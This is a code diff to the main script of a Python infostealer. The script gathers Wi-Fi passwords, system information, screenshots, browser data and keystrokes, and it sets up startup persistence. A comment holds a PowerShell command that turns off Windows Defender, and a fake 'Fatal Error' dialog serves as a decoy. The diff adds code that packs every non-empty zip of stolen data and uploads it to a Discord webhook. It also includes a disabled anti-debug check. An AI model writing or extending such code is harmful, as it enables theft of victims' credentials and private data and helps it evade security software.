@@ -4,14 +4,22 @@ from modules.info import start
 from modules.wifi import WifiPasswords
 from modules.keylogger import Keylogger
 from modules.startup import StartUp
+#from modules.antidebug import Antidebug
 from tkinter import messagebox
+import os
 import zipfile
 import subprocess
 import discord
 from discord import File, SyncWebhook
 import socket
 import requests
+#import config
 
+#try:
+#    AntiDebug = Antidebug()
+#    AntiDebug.check()
+#except:
+#    pass
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
@@ -36,7 +44,8 @@ except:
     keylogger = "null"
 
 def error():
-    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.", )
+    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
+    
 #error()
 
 
@@ -77,6 +86,20 @@ def zip(name, files):
 zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png"])
 delete_files(["wifi.txt", "system.txt"]) #delete_files(["wifi.txt", "system.txt", "screenshot.png"])
 
+zip_files = []
+
+dir = os.path.dirname(os.path.realpath(__file__))
+for filename in os.listdir(dir):
+    if filename.endswith(".zip") and filename != "System.zip":
+        with zipfile.ZipFile(os.path.join(dir, filename), 'r') as zipfile_:
+            if len(zipfile_.namelist()) != 0:
+                zip_files.append(filename)
+            #if len(zipfile_.namelist()) == 0:
+            #    delete_files([os.path.join(dir, filename)])
+            #else:
+            #    zip_files.append(filename)
+
+
 def send(url, files, text):
     try:
         webhook = SyncWebhook.from_url(url)#https://discord.com/api/webhooks/ID/TOKEN
@@ -116,9 +139,11 @@ except:
     pass
 
 try:
-    send(webhook, ["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"], "Browser Data")
+    #send(webhook, ["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"], "Browser Data")
+    send(webhook, zip_files, "Browser Data")
 except:
     pass
+
 
 if keylogger == "True":
     try:
